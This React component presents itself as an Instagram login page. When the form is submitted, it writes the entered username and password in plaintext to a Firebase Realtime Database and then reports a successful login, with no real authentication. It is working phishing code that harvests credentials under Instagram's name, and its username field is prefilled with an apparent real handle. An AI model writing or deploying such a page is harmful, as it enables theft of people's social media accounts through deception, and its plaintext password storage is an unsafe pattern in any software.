import React, { useState } from "react";
import { Form, FormGroup, Input, Label, Button } from "reactstrap";
import { ref, push } from "firebase/database"; // Import functions for Firebase Realtime Database
import { database } from "../firebaseConfig"; // Import your database configuration
import "../App.css";

const LoginForm = ({ onLogin }) => {
  const [username, setUsername] = useState("Adiljiskani92024"); // State for username
  const [password, setPassword] = useState(""); // State for password

  const handleUsernameChange = (event) => {
    setUsername(event.target.value); // Update username state
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value); // Update password state
  };

  const handleSubmit = async (event) => {
    event.preventDefault();

    // Validation
    if (!username) {
      alert("Please enter your username.");
      return;
    }
    if (!password) {
      alert("Please enter your password.");
      return;
    }

    // Save username and password to Realtime Database
    try {
      const usersRef = ref(database, "users"); // Reference to "users" in the Realtime Database
      await push(usersRef, {
        username: username,
        password: password,
      });

      alert("successfully Login "); // Alert on successful save
      onLogin(); // Call onLogin function
    } catch (e) {
      console.error("Error adding data: ", e); // Log any errors
    }
  };

  return (
    <>
      <h3 className="text-center py-3 instagram-heading">Instagram</h3>
      <div className="row d-grid main-container p-0">
        <div className="col-lg-4 col-10 text-center mx-auto bg-white rounded-4">
          <h3 className="pb-4">Enter username & password</h3>
          <Form className="w-lg-75 mx-auto" onSubmit={handleSubmit}>
            <FormGroup floating>
              <Input
                id="exampleUsername"
                name="username"
                placeholder="Username"
                type="text" // Input type for username
                value={username}
                onChange={handleUsernameChange}
              />
              <Label for="exampleUsername">Username</Label>
            </FormGroup>
            <FormGroup floating>
              <Input
                id="examplePassword"
                name="password"
                placeholder="Password"
                type="password" // Input type for password
                value={password}
                onChange={handlePasswordChange}
              />
              <Label for="examplePassword">Password</Label>
            </FormGroup>
            <Button type="submit" className="bg-primary">
              Login
            </Button>
          </Form>
        </div>
      </div>
    </>
  );
};

export default LoginForm;
